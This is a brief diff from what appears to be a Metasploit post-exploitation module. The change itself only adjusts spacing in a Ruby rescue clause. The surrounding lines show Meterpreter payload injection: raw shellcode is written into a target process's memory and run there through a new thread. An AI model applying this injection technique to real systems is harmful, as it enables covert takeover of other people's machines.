@@ -90,7 +90,7 @@ class Metasploit3 < Msf::Post
       host_process.memory.write(mem, raw)
       host_process.thread.create(mem, 0)
       print_good("Successfully injected Meterpreter in to process: #{target_pid}")
-    rescue::Exception => e
+    rescue ::Exception => e
       print_error("Failed to Inject Payload to #{target_pid}!")
       print_error(e)
     end
